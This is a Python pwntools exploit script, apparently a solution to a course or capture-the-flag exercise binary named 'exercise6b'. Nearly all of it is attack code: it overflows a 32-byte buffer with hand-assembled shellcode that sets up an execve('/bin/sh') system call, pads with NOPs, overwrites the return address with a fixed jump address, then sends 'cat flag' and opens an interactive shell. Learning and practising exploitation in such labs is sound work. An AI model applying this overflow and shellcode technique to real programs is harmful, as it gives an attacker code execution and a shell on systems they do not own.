#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = 'handout/exercise6/exercise6b'
exe = './exercise6b'
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================


r = start()
jmp = 0x401616
payload = b'A'*32 # buffer size
#print(len(asm("nop")))
#
payload += asm("mov rsi, r13")
payload += asm("sub rsi, rax")
payload += asm("xor r12, r12")
payload += asm("lea r8, [rsi+0xe]")
payload += asm("lea rdi, [r8+1]")
payload += asm("lea r8, [r8+0x8]")
payload += asm("mov [r8], r12")
payload += asm("lea r12, [r12+4]")
payload += asm("lea r12, [r12+4]")
payload += asm("sal r12, 8")
payload += asm("lea r12, [r12+0x0e]")
payload += asm("lea r12, [r12+1]")
payload += asm("lea r8, [rsi-3]")
payload += asm("mov [r8], r12")
payload += asm("xor r8, r8")
payload += asm("mov rsi, r8")
payload += asm("mov rdx, r8")
payload += asm("xor r12, r12")
payload += asm("lea rax, [r12+59]")


payload += b'\x90'*39 + b"/bin/sh"
payload += b'\x90' * (264-len(payload)) + p64(jmp)

r.sendline(b'1')
r.recvuntil(b" note:")
r.sendline(payload )
r.sendline(b"cat flag")
r.interactive()